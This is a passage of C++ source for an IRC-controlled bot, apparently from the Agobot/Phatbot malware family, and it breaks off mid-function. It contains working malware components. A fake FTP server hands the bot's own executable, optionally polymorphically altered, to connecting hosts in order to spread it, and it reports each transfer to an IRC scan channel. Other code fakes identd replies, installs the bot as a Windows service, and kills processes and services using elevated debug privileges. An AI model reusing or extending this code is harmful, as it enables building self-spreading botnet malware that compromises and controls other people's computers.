			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getpeername(sClientSocket, &sa, &sas);
			// Break if the ip is 0.0.0.0
			if(!(unsigned char)sa.sa_data[2]) continue;

			if(g_cMainCtrl.m_cBot.csendfile_show.bValue)
				g_cMainCtrl.m_cIRC.SendFormat(false, false, 
				g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
					"%s: %d.%d.%d.%d %s %d", 
					dp(6,20,16,0).CStr(), 			// ftp (text)
					(unsigned char)sa.sa_data[2], 
					(unsigned char)sa.sa_data[3], 
					(unsigned char)sa.sa_data[4], 
					(unsigned char)sa.sa_data[5], 
					dp(15,14,0).CStr(),				// on (text)
					g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue);
			
			#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(1, "[0x%8.8Xh]:(word) accept %d.%d.%d.%d\n", this, 
					(unsigned char)sa.sa_data[2], \
					(unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], \
					(unsigned char)sa.sa_data[5]);
			#endif
		
			int count=4096; 
			CString sFileName; 
			GetFilename(sFileName.GetBuffer(4096), 4096);
			CString sOutFileName(sFileName); 

			sOutFileName.Append(".poly");
			if(!g_cMainCtrl.m_cPolymorph.DoPolymorph(sFileName.CStr(), sOutFileName.CStr())) {
				DeleteFile(sOutFileName.CStr());
				sOutFileName.Assign(sFileName);
			// }

			fp=fopen(sOutFileName.CStr(), "rb");
			int length = GetFileSize(sFileName.Str(), NULL);
			if(fp) 
			{
				#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(5, "[0x%8.8Xh]: sending\n", this);
				#endif
				fseek(fp, 0, SEEK_END); long filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
				char *filesize1=(char*)&filesize; char fsbuf[4]; fsbuf[4]='\0';
				fsbuf[0]=(char)filesize1[0]; fsbuf[1]=(char)filesize1[1];
				fsbuf[2]=(char)filesize1[2]; fsbuf[3]=(char)filesize1[3];
				xWrite(sClientSocket, (char*)fsbuf, sizeof(long));

				while(count==4096)
				{	
					memset(fileBuf, 0, sizeof(fileBuf));
					count=fread(fileBuf, sizeof(char), 4096, fp);
					if(ferror(fp)) break;
					xWrite(sClientSocket, (char*)fileBuf, count); 
				}

				if(g_cMainCtrl.m_cBot.csendfile_show.bValue)
					g_cMainCtrl.m_cIRC.SendFormat(false, false, 
					g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
						"ftp: %d.%d.%d.%d -> (%d)", \
						(unsigned char)sa.sa_data[2], \
						(unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], \
						(unsigned char)sa.sa_data[5], \
						length);

				#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "[0x%8.8Xh]: send @ %d.%d.%d.%d complete\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
				#endif

				fclose(fp); 
			}
			xClose(sClientSocket); 
		}
		Sleep(2500); 
	}

	xClose(m_sListenSocket);

	return NULL;
}
*/
void *CSendFileFTP::Run()
{	
	int sClientSocket; 
	sockaddr_in cAddr;
	socklen_t cAddrLen=sizeof(cAddr);
	unsigned char fileBuf[4096]; 
	FILE *fp=NULL;

	memset(&m_lAddr, 0, sizeof(m_lAddr));
	m_lAddr.sin_family=AF_INET;
	m_lAddr.sin_addr.s_addr=INADDR_ANY;
	m_lAddr.sin_port=htons(g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue);
	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if(m_sListenSocket == SOCKET_ERROR) 
	{ 
		g_cMainCtrl.m_lCanJoin.push_back(this); 
		return NULL; 
	}
	#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "Port Bound = %d\n", 
		g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue);
	#endif

	if(bind(m_sListenSocket, (sockaddr*)&m_lAddr, sizeof(m_lAddr))!=0) 
	{ 
		xClose(m_sListenSocket); 
		g_cMainCtrl.m_lCanJoin.push_back(this); 
		return NULL; 
	}

	#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "Listen on = %d\n",
		g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue);
	#endif

	while(g_cMainCtrl.m_bRunning)
	{	

		if(listen(m_sListenSocket, 10) == SOCKET_ERROR) 
		{ 
			Sleep(250); 
			continue; 
		}

		sClientSocket=accept(m_sListenSocket, (sockaddr*)&cAddr, &cAddrLen);
		if(sClientSocket!=SOCKET_ERROR)
		{
			sockaddr sa; 
			socklen_t sas=sizeof(sa); 
			memset(&sa, 0, sizeof(sa)); 
			getpeername(sClientSocket, &sa, &sas);
			if(!(unsigned char)sa.sa_data[2]) continue;

			if(g_cMainCtrl.m_cBot.csendfileftp_show.bValue)
				g_cMainCtrl.m_cIRC.SendFormat(false, false, 
				g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
					"ftp: %d.%d.%d.%d on %d", \
					(unsigned char)sa.sa_data[2], \
					(unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], \
					(unsigned char)sa.sa_data[5], \
					g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue);
			
			#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "ftp: %d.%d.%d.%d on %d\n", \
					(unsigned char)sa.sa_data[2], \
					(unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], \
					(unsigned char)sa.sa_data[5], \
					g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue);
			#endif
		
			int count=4096; 
			CString sFileName; 
			GetFilename(sFileName.GetBuffer(4096), 4096);
			CString sOutFileName(sFileName); 
			sOutFileName.Assign(sFileName);

			char szRecvBuf[2048];
			char *szWelcome="220 \r\n";
			xWrite(sClientSocket, szWelcome, strlen(szWelcome));

			recv_line_irc(sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL);
			char *szPassword="331 \r\n";
			xWrite(sClientSocket, szPassword, strlen(szPassword));

			recv_line_irc(sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL);
			char *szLoginOk="230 \r\n";
			xWrite(sClientSocket, szLoginOk, strlen(szLoginOk));

			recv_line_irc(sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL);
			char *szBinary="200 \r\n";
			xWrite(sClientSocket, szBinary, strlen(szBinary));

			recv_line_irc(sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL);
				
			CString sLine(szRecvBuf); CString sData(sLine.Token(1, " "));
			int iIp1=atoi(sData.Token(0, ",").CStr());
			int iIp2=atoi(sData.Token(1, ",").CStr());
			int iIp3=atoi(sData.Token(2, ",").CStr());
			int iIp4=atoi(sData.Token(3, ",").CStr());
			int iPort1=atoi(sData.Token(4, ",").CStr());
			int iPort2=atoi(sData.Token(5, ",").CStr());
			char szTemp[2]; szTemp[1]=iPort1; szTemp[0]=iPort2;
			unsigned short *sPort=(unsigned short*)szTemp;
			unsigned int iPort=(unsigned int)*sPort;
			char szIp[128]; sprintf(szIp, "%d.%d.%d.%d", iIp1, iIp2, iIp3, iIp4);
			char *szPortOK="200 \r\n";
			xWrite(sClientSocket, szPortOK, strlen(szPortOK));
			
			recv_line_irc(sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL);
			char *szBinaryOpen="150 \r\n";
			xWrite(sClientSocket, szBinaryOpen, strlen(szBinaryOpen));

			int sSendSocket=DoTcpConnect(szIp, iPort);

			fp=fopen(sOutFileName.CStr(), "rb");
			if(fp && sSendSocket!=SOCKET_ERROR) 
			{

				#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(5, "Sending file...\n");
				#endif

				fseek(fp, 0, SEEK_END); 
				long filesize=ftell(fp); 
				int fileSizeKB = filesize;

				fseek(fp, 0, SEEK_SET);
				

				while(count==4096)
				{	
					memset(fileBuf, 0, sizeof(fileBuf));
					count=fread(fileBuf, sizeof(char), 4096, fp);
					if(ferror(fp)) break;
					xWrite(sSendSocket, (char*)fileBuf, count); 
				}

				m_totalSends++;	// Increase total complete sends

				if(g_cMainCtrl.m_cBot.csendfileftp_show.bValue)
					g_cMainCtrl.m_cIRC.SendFormat(false, false, 
					g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
						"$ftp -> %d.%d.%d.%d -> (%d bytes) (total sends: %d)", \
						(unsigned char)sa.sa_data[2], \
						(unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], \
						(unsigned char)sa.sa_data[5], \
						fileSizeKB, m_totalSends);

				#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(5, "ftp: %d.%d.%d.%d -> (%db bytes)\n",
						(unsigned char)sa.sa_data[2], \
						(unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], \
						(unsigned char)sa.sa_data[5], \
						fileSizeKB);
				#endif
				
				fclose(fp); 
				xClose(sSendSocket); 
			}

			char *szComplete="226 \r\n";
			xWrite(sClientSocket, szComplete, strlen(szComplete));

			recv_line_irc(sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL);
			char *szGoodbye="221 \r\n";
			xWrite(sClientSocket, szGoodbye, strlen(szGoodbye));

			xClose(sClientSocket);
		}
		Sleep(2500); 
	}
	xClose(m_sListenSocket);
	return NULL;
}

void *CIdentD::Run()
{	int	m_sListenSocket, sClientSocket; char ibuff[64];

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Binding IdentD to port 113.\n", this);
#endif

	m_sListenSocket=DoTcpBind(113);
	if(m_sListenSocket==SOCKET_ERROR) {
		g_cMainCtrl.m_bIdentD_Running = false;
		return NULL; }

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Listening on port 113.\n", this);
#endif

	g_cMainCtrl.m_bIdentD_Running=true;

	while(!g_cMainCtrl.m_cBot.m_bJoined) {
		sockaddr_in cAddr; sClientSocket=DoTcpAccept(m_sListenSocket, &cAddr);
 		if(sClientSocket!=SOCKET_ERROR) {

#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Connection from %s accepted.\n", this, inet_ntoa(to_in_addr(cAddr.sin_addr.s_addr)));
#endif

			CString sIdentD; init_random();
			int nl=(rand()%3)+10; sIdentD.Assign("");
			for(int n=0;n<nl;n++)
			{	CString sTemp; sTemp.Assign(sIdentD);
			sIdentD.Format("%s%c", sTemp.CStr(), (rand()%26)+97); }
			
			sIdentD[10] = 0;

			memset(ibuff, 0, sizeof(ibuff));
			sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, 113, sIdentD.CStr()); // build ident reply
			xWrite(sClientSocket, (char*)ibuff, sizeof(ibuff)); // send file

			xClose(sClientSocket); }
		else
		{	Sleep(2000); return NULL; }

		xClose(m_sListenSocket);
		g_cMainCtrl.m_bIdentD_Running = false;
		break;
	}

	xClose(sClientSocket);

	return NULL;
}

#ifdef WIN32

VOID WINAPI ServiceStart(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD opcode);

SERVICE_STATUS			ServiceStatus;
SERVICE_STATUS_HANDLE	ServiceStatusHandle;

CService *g_cService;

void WINAPI ServiceCtrlHandler(DWORD Opcode) {
	switch(Opcode) {
	case SERVICE_CONTROL_PAUSE:
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Got pause opcode.\n");
#endif
		ServiceStatus.dwCurrentState		= SERVICE_PAUSED;
		g_cService->Suspend();
		break;

	case SERVICE_CONTROL_CONTINUE:
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Got continue opcode.\n");
#endif
		ServiceStatus.dwCurrentState		= SERVICE_RUNNING;
		g_cService->Resume();
		break;

	case SERVICE_CONTROL_STOP:
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Got stop opcode.\n");
#endif
		ServiceStatus.dwWin32ExitCode		= 0;
		ServiceStatus.dwCurrentState		= SERVICE_STOPPED;
		ServiceStatus.dwCheckPoint			= 0;
		ServiceStatus.dwWaitHint			= 0;
		g_cService->Kill();
		break;

	case SERVICE_CONTROL_INTERROGATE:
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Got interrogate opcode.\n");
#endif
		break;
	default:
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(3, "ServiceCtrlHandler(utility.cpp): Unknown value %d\n", Opcode);
#endif
		break; }
	
#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Setting service to running...\n");
#endif
	ServiceStatus.dwCurrentState			= SERVICE_RUNNING;
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Finished handler.\n");
#endif
	return; }

/*
	This function starts the service
*/

void WINAPI ServiceStart(DWORD argc, LPTSTR *argv) {
	DWORD status; DWORD specificError;

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Starting up service...\n");
#endif

	ServiceStatus.dwServiceType				=	SERVICE_WIN32_SHARE_PROCESS;
	ServiceStatus.dwCurrentState			=	SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted		=	SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwWin32ExitCode			=	0;
	ServiceStatus.dwServiceSpecificExitCode	=	0;
	ServiceStatus.dwCheckPoint				=	0;
	ServiceStatus.dwWaitHint				=	0;
	
#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Registering service handler...\n");
#endif
	ServiceStatusHandle=RegisterServiceCtrlHandler(g_cMainCtrl.m_cBot.as_service_name.sValue.CStr(), ServiceCtrlHandler);
	
	if(ServiceStatusHandle==(SERVICE_STATUS_HANDLE)0) return;

	ServiceStatus.dwCurrentState			=	SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint				=	0;
	ServiceStatus.dwWaitHint				=	0;

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Setting service to running...\n");
#endif
	if(!SetServiceStatus(ServiceStatusHandle, &ServiceStatus)) return;

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Finished Initialization.\n");
#endif
	return; }

CService::CService() { }

void *CService::Run() {
	g_cService=this; char as_service_name[256];

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CService::CService(utility.cpp): Starting service...\n");
#endif

	strncpy(as_service_name, g_cMainCtrl.m_cBot.as_service_name.sValue.CStr(), sizeof(as_service_name));

	SERVICE_TABLE_ENTRY DispatchTable[]= {
		{	as_service_name,	ServiceStart	},
		{	NULL,				NULL			} };

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CService::CService(utility.cpp): Starting service control dispatcher...\n");
#endif

	if(!StartServiceCtrlDispatcher(DispatchTable)) {
#ifdef DBGCONSOLE
		DWORD dwError=GetLastError();
		switch(dwError) {
		case ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
			g_cMainCtrl.m_cConsDbg.Log(3, "CService::CService(utility.cpp): StartServiceCtrlDispatcher(): Failed to connect to service controller.\n");
			break;
		case ERROR_INVALID_DATA:
			g_cMainCtrl.m_cConsDbg.Log(3, "CService::CService(utility.cpp): StartServiceCtrlDispatcher(): Invalid data.\n");
			break;
		case ERROR_SERVICE_ALREADY_RUNNING:
			g_cMainCtrl.m_cConsDbg.Log(3, "CService::CService(utility.cpp): StartServiceCtrlDispatcher(): Service already running.\n");
			break;
		}
#endif
	}

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CService::CService(utility.cpp): Finished.\n");
#endif

	return NULL; }

#endif // WIN32

#ifdef WIN32
bool WriteFile(const char *filename, int resnum, LPCTSTR lpModuleName) {
	FILE *fp=fopen(filename, "wb"); if(!fp) return false;
	HMODULE hMod=GetModuleHandle(lpModuleName); if(!hMod) return false;
	HRSRC hBinary=FindResource(hMod, MAKEINTRESOURCE(resnum), TEXT("BINRES")); if(!hBinary) return false;
	HGLOBAL hGbDesc=LoadResource(hMod, hBinary); 
	DWORD dwSize=SizeofResource(hMod, hBinary); 
	PBYTE pData=(unsigned char*)LockResource(hGbDesc); 
	fwrite(pData, sizeof(unsigned char), dwSize, fp);
	fclose(fp); UnlockResource(hBinary);
	return true; }
#endif // WIN32

/*
	This turns a numeric ip or hostname into an unsigned long
*/

unsigned long ResolveAddress(const char *szHost) {
	unsigned long lAddr=inet_addr(szHost);
	if(lAddr==INADDR_NONE) {
		hostent *pHE=gethostbyname(szHost);
		if(!pHE) return INADDR_NONE;
		lAddr=*((unsigned long*)pHE->h_addr_list[0]); }
	return lAddr; }

int DoTcpConnect(const char *szHost, int iPort) {
	int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sSocket==INVALID_SOCKET) return SOCKET_ERROR;
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
	ssin.sin_port=htons(iPort); ssin.sin_addr.s_addr=ResolveAddress(szHost);
	if(connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in))==SOCKET_ERROR) {
		xClose(sSocket); return SOCKET_ERROR; }
	return sSocket; }

int DoTcpBind(int iPort) {
	int sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sListenSocket==INVALID_SOCKET) return SOCKET_ERROR;
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
	ssin.sin_port=htons(iPort); ssin.sin_addr.s_addr=INADDR_ANY;
	if(bind(sListenSocket, (sockaddr*)&ssin, sizeof(ssin))!=0) {
		xClose(sListenSocket); return SOCKET_ERROR; }
	return sListenSocket; }

int DoTcpAccept(int sSocket) {
	if(listen(sSocket, 10)==SOCKET_ERROR) return SOCKET_ERROR;
	sockaddr_in cssin; socklen_t clen=sizeof(cssin);
	int sClientSocket=accept(sSocket, (sockaddr*)&cssin, &clen);
	if(sClientSocket==SOCKET_ERROR) return SOCKET_ERROR;
	return sClientSocket; }

int DoTcpAccept(int sSocket, sockaddr_in *cssin) {
	if(!cssin) return SOCKET_ERROR;
	if(listen(sSocket, 10)==SOCKET_ERROR) return SOCKET_ERROR;
	socklen_t clen=sizeof(*cssin);
	int sClientSocket=accept(sSocket, (sockaddr*)cssin, &clen);
	if(sClientSocket==SOCKET_ERROR) return SOCKET_ERROR;
	return sClientSocket; }

/*
	This kills a process
	Win32:	Uses PsApi to enum processes and terminates matching strings
	Linux:	Uses "killall -9 <process name>" to kill every instance of the process
*/

bool KillProcess(const char *szProcName) {
#ifdef WIN32
	HANDLE hProcess; DWORD aProcesses[1024], cbNeeded, cProcesses; bool bRetVal=false;
	unsigned int i; char szProcessName[MAX_PATH]; HMODULE hMod;
	if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
	cProcesses=cbNeeded/sizeof(DWORD);
	for(i=0; i<cProcesses; i++)
	{	strcpy(szProcessName, "unknown");
		hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, aProcesses[i]);
		if(hProcess)
		{	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
			{	GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if(!stricmp(szProcessName, szProcName))
				{	TerminateProcess(hProcess, 0);
					bRetVal=true; } }
		CloseHandle(hProcess); } }
	return bRetVal;
#else
	CString sCmdBuf; sCmdBuf.Format("killall -q -9 %s", szProcName);
	system(sCmdBuf.CStr()); return true;
#endif // WIN32
}

#ifdef _WIN32
bool KillService(const char *szSvcName)
{
	if ((ServiceDel((CString)szSvcName)))
	{
		CString tmpBuff;
		HKEY hkey=NULL; unsigned char szDataBuf2[1024];
		char line[100]; DWORD dwSize = 128; LONG lRet=0;
		tmpBuff.Format("SYSTEM\\CurrentControlSet\\Services\\%s",szSvcName);
		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, tmpBuff, 0, KEY_READ, &hkey);
		RegQueryValueEx(hkey, "ImagePath", NULL, NULL, szDataBuf2, &dwSize);
		string s = (char*)szDataBuf2;
		int pos = s.find_last_of("\\");
		s.erase(0, pos + 1);
		KillProcess(s.c_str());
		DeleteFile(tmpBuff);
		return TRUE;
	}
	else { return FALSE; }
}

/*
	This lists all processes in a std::list
*/


bool ServiceDel(CString &sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename.CStr(), SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	SERVICE_STATUS sStatus; DeleteService(hService);
	DeleteService(hService);
	ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
	DeleteService(hService);
	ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);
	return true;
}

bool KillPid(unsigned long lPid) {
#ifdef _WIN32
	bool bRetVal=false;

	// Get SeDebugPrivileges
	TOKEN_PRIVILEGES tPriv, tPrivOld; DWORD cbPriv=sizeof(tPrivOld); HANDLE hToken;
	
	if(!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken) {
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "KillProcess(): Own thread token opened.\n");
#endif
		tPriv.PrivilegeCount=1; tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(AdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv)) {
#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(5, "KillProcess(): Privileges adjusted.\n");
#endif
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED) {
				CloseHandle(hToken); hToken=NULL; }
		} else {
			CloseHandle(hToken); hToken=NULL; } }

	HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, lPid);
	if(hProcess) { TerminateProcess(hProcess, 0); bRetVal=true; CloseHandle(hProcess); }

	// Drop SeDebugPrivileges
	if(hToken) {
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "KillProcess(): Privileges dropped.\n");
#endif
		AdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken); }

	return bRetVal;
#else
	char szCmdBuf[256];
	sprintf(szCmdBuf, "kill -9 %d", lPid);
	system(szCmdBuf);
#endif // _WIN32
}


bool ListProcesses(std::list<process_info> *lProcesses) {
#ifdef WIN32

	typedef BOOL (WINAPI * PFNENUMPROCESSES)(
		DWORD * lpidProcess,
		DWORD   cb,
		DWORD * cbNeeded
		);

	typedef BOOL (WINAPI * PFNENUMPROCESSMODULES)(
		HANDLE hProcess,
		HMODULE *lphModule,
		DWORD cb,
		LPDWORD lpcbNeeded
		);

	typedef DWORD (WINAPI * PFNGETMODULEFILENAMEEXA)(
		HANDLE hProcess,
		HMODULE hModule,
		LPSTR lpFilename,
		DWORD nSize
		);

	static HMODULE hModPSAPI = 0;
	static PFNENUMPROCESSES EnumProcesses = 0;
	static PFNENUMPROCESSMODULES EnumProcessModules = 0;
	static PFNGETMODULEFILENAMEEXA GetModuleFileNameExA = 0;

	hModPSAPI = GetModuleHandle("PSAPI.DLL");
	if (!hModPSAPI) hModPSAPI = LoadLibrary("PSAPI.DLL");
	if (!hModPSAPI) return FALSE;

	EnumProcesses = (PFNENUMPROCESSES)
			GetProcAddress(hModPSAPI,"EnumProcesses");

	EnumProcessModules = (PFNENUMPROCESSMODULES)
			GetProcAddress(hModPSAPI, "EnumProcessModules");

	GetModuleFileNameExA = (PFNGETMODULEFILENAMEEXA)
			GetProcAddress(hModPSAPI, "GetModuleFileNameExA");

	if (!EnumProcesses || !EnumProcessModules || !GetModuleFileNameExA)	return FALSE;

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!EnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded)) return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	for ( int i = 0; i < cProcesses; i++ )
	{
	  HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
		if ( hProcess )
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
			{
				GetModuleFileNameExA( hProcess, hMod, szProcessName,sizeof(szProcessName) );
				process_info pInfo;
				pInfo.sProcessName.Assign(szProcessName);
				pInfo.lProcessPid=aProcesses[i];
				lProcesses->push_back(pInfo);
			}
			CloseHandle( hProcess );
		}
	}
	return TRUE;
#else
	CString sCmdBuf; sCmdBuf.Format("ps ax > tempfile");
	system(sCmdBuf.CStr());

	// FIXME: Parse "ps ax" output here

	DeleteFile("tempfile");
	return true;
#endif // WIN32
}

bool ListServices(std::list<CString> *lServices) {
SC_HANDLE scm=OpenSCManager(NULL,NULL,GENERIC_READ);
if(scm == NULL) { return FALSE; }
const char *szServicesToIgnore[] ={
	"AudioSrv", "Browser", "CryptSvc", "Dhcp", "dmserver",
	"Dnscache" , "ERSvc" , "Eventlog" , "EventSystem", "FastUserSwitchingCompatibility",
	"helpsvc", "lanmanserver", "lanmanworkstation" , "LmHosts" , "MDM", "Messenger",
	"Netman", "Nla", "PlugPlay", "PolicyAgent", "ProtectedStorage", "RasMan",
	"RpcSs" , "SamSs" , "Schedule" , "seclogon" , "SENS" , "ShellHWDetection",
	"Spooler" , "SSDPSRV" , "stisvc" , "TapiSrv" , "TermService", "TrkWks",
	"uploadmgr" , "upnphost" , "W32Time" , "WebClient", "winmgmt" , "WZCSVC",
	"wuauserv", "srservice", "Themes", NULL
};

DWORD nMemoryNeeded;
DWORD nNumberServices;
DWORD nDummy=0;
BYTE cDummy[16];
CString tmpBuff;
HKEY hkey=NULL; unsigned char szDataBuf2[1024];
char line[100]; DWORD dwSize = 128; LONG lRet=0;
EnumServicesStatus(scm,SERVICE_WIN32,SERVICE_ACTIVE,(ENUM_SERVICE_STATUS *)cDummy,0,&nMemoryNeeded,&nNumberServices,&nDummy);
ENUM_SERVICE_STATUS *lpBuffer=(ENUM_SERVICE_STATUS *)malloc(nMemoryNeeded);
EnumServicesStatus(scm,SERVICE_WIN32,SERVICE_ACTIVE,lpBuffer,nMemoryNeeded,&nMemoryNeeded,&nNumberServices,&nDummy);
for(unsigned int i=0;i<nNumberServices;i++)
{
	for(int a=0; szServicesToIgnore[a]!=NULL; a++)
	{ 
		if(!stricmp(szServicesToIgnore[a], lpBuffer[i].lpServiceName)) goto Next_i;
	}
	
	tmpBuff.Format("SYSTEM\\CurrentControlSet\\Services\\%s",lpBuffer[i].lpServiceName);
	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, tmpBuff, 0, KEY_READ, &hkey);
	if(lRet != ERROR_SUCCESS)
	{
		tmpBuff.Format("[%s] [????.exe] (Unknown key)",lpBuffer[i].lpServiceName);
	}
	else
	{
		lRet = RegQueryValueEx(hkey, "ImagePath", NULL, NULL, szDataBuf2, &dwSize);
		if(lRet != ERROR_SUCCESS)
		{
			tmpBuff.Format("[%s] [????.exe]",lpBuffer[i].lpServiceName);
		}
		else
		{
			tmpBuff.Format("[%s] [%s]",lpBuffer[i].lpServiceName,szDataBuf2);
		}
	}
	lServices->push_back((CString)tmpBuff);
Next_i:
;
}
CloseServiceHandle(scm);
return TRUE;
}

#endif // _WIN32

/*
	This returns the filename of the executable in the filesystem
	Win32:	uses GetModuleFilename on the currently running module
	Linux:	uses /proc/<pid>/exe which is a like to the executable image
*/

char* GetFilename(char* szFilename, size_t sBufSize)
{
	GetModuleFileName(GetModuleHandle(NULL), szFilename, sBufSize);
	return szFilename;
}

/*
	This calculates a TCP/IP checksum
*/

#ifdef WIN32
	#define USE_ASM
#endif // WIN32

unsigned short checksum(unsigned short *buffer, int size) {
	unsigned long cksum=0;

#ifdef USE_ASM

	unsigned long lsize=size;
	char szMMBuf[8], *pMMBuf=szMMBuf;

	__asm {
		FEMMS

		MOV			ECX, lsize				// ecx=lsize;
		MOV			EDX, buffer				// edx=buffer;
		MOV			EBX, cksum				// ebx=cksum;

		CMP			ECX, 2					// size<2;
		JS			CKSUM_LOOP2				// goto loop 2

CKSUM_LOOP:

		XOR			EAX, EAX				// eax=0;
